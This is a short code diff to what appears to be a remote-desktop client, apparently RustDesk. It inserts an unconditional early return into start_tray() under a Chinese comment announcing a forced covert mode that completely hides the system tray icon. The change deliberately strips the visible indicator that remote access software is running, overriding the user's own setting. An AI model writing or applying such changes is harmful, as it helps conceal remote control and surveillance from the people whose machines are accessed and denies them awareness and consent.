@@ -9,6 +9,8 @@ use std::sync::{Arc, Mutex};
 use std::time::Duration;
 
 pub fn start_tray() {
+    // 强制无感知隐蔽模式：彻底屏蔽右下角系统托盘图标
+    return;
     if crate::ui_interface::get_builtin_option(hbb_common::config::keys::OPTION_HIDE_TRAY) == "Y" {
         #[cfg(not(target_os = "macos"))]
         {
